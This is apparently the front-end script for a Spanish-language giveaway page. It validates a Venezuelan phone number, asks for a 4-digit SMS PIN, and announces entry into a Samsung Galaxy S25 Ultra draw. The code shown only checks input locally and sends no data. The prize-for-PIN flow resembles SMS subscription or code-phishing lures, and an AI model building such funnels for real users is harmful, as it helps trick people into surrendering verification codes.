const phoneForm = document.getElementById("phoneForm");
const formContainer = document.getElementById("formContainer");
const errorMsg = document.getElementById("errorMsg");

phoneForm.addEventListener("submit", function(e) {
  e.preventDefault();
  const phoneInput = document.getElementById("phone").value.trim();

  const regex = /^4\d{9}$/;
  if (!regex.test(phoneInput)) {
    errorMsg.textContent = "Por favor ingresa un número válido de Venezuela (ej: 4121234567)";
    return;
  }

  errorMsg.textContent = "";

  // Paso 2: Solicitud del PIN
  formContainer.innerHTML = `
    <form id="pinForm">
      <p>Te enviamos un PIN por SMS. Ingresa los 4 dígitos para confirmar tu participación:</p>
      <div class="input-group">
        <input type="text" id="pin" maxlength="4" pattern="\\d{4}" placeholder="0000" required>
      </div>
      <small id="pinError" class="error"></small>
      <button type="submit">Verificar PIN</button>
    </form>
  `;

  const pinForm = document.getElementById("pinForm");
  const pinError = document.getElementById("pinError");

  pinForm.addEventListener("submit", function(e) {
    e.preventDefault();
    const pinValue = document.getElementById("pin").value.trim();

    if (!/^\d{4}$/.test(pinValue)) {
      pinError.textContent = "El PIN debe tener 4 dígitos numéricos.";
      return;
    }

    formContainer.innerHTML = `<div class="message">Bienvenido a Que Guay viajes! ya estas participando por un Samsung Galaxy S25 Ultra
    </div>`;
  });
});
